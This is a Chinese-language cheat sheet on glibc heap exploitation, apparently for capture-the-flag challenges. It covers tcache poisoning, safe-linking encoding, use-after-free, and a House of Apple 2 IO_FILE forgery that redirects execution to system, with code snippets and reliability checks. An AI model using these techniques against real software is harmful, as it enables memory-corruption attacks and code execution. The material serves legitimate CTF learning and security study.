# 堆 tcache/UAF 速查（glibc 2.26–2.35+）

> 配套 `Tool/skill/pwn-crypto/references/heap-and-sandbox.md`。偏移必须用目标 libc 复核。

## 1. 版本先决

```bash
ldd --version | head -1
strings -a libc.so.6 | grep -m1 'GNU C Library'
pwn checksec ./chall
```

| 版本 | 变化 | 影响 |
|---|---|---|
| 2.26+ | tcache | 每 size 7 个，LIFO |
| 2.29+ | tcache key | 二次 free 需清 key |
| 2.32+ | safe-linking | `fd = target ^ (chunk>>12)` |
| 2.34+ | 移除 `__free_hook` | 改 IO/exit/程序指针 |
| 2.35+ | IO vtable 检查 | vtable 必须合法 |

## 2. 泄漏顺序

1. **heap**：释放两个同 size，读第一个 `fd`；2.32+ 解码。
2. **libc**：填满 tcache 后释放进 unsorted bin，读 `fd/bk`；`main_arena` 偏移用 gdb 确认。
3. **stack**：libc + `environ` 偏移，读 `environ`，再回栈找返回地址。

```python
def dec(x, where): return x ^ (where >> 12)
def enc(x, where): return x ^ (where >> 12)
```

**判据**：泄漏值页对齐；`vmmap` 段名正确；解码后 fd 是堆地址或 0。

## 3. tcache poison

```python
free(0); free(0)              # 2.29+ 先清 key
edit(0, p64(enc(target, chunk)))
add(size)                     # 取回
add(size)                     # malloc 返回 target
```

- target：`__free_hook`（<2.34）→ `_IO_list_all`/`exit_funcs`（≥2.34）→ 程序指针 → `environ`。
- target 按 0x10 对齐；`/bin/sh` 放已知 chunk。
- 2.34+ 找不到 `__free_hook` 是正常的，不是偏移错。

**判据**：`malloc` 返回 target；`vis_heap_chunks` 重叠可见；触发不 abort。
**失败**：count 满、key 未清、safe-linking 未编码、未对齐。

## 4. UAF / double free

- 释放后仍可 show/edit = UAF；同一 chunk 入链两次需过 key/count 检查。
- 先证明“能读 stale 指针”，再谈写；不要直接把 stale 指针当有效对象。
- overlap 类题目先改相邻 chunk 的 size/fd，`free` 不 abort 才算成立。

## 5. IO_FILE（2.34+）

```text
exit -> _IO_flush_all_lockp -> _IO_OVERFLOW(fp)
vtable 必须在 __libc_IO_vtables
House of Apple 2: vtable=_IO_wfile_jumps
  _IO_write_ptr > _IO_write_base
  _wide_data write_base=0, write_ptr=1
  _wide_data->_wide_vtable->__doallocate = system
```

**判据**：gdb 命中 `_IO_wfile_overflow`/`system`；`p _IO_list_all` 指向伪造结构。
**失败**：vtable 越界、`_wide_data` 未映射、`_lock` 为空、触发路径没走 flush。

## 6. 稳定性

```bash
for i in $(seq 10); do timeout 30 python3 exploit.py; done
```

- 全新进程 ≥9/10；远程有 flag/root 证据。
- 记录 glibc build id、seccomp 白名单、失败路线。
- 同一路径 3 轮无进展换路线；同类动态尝试最多 2 次。
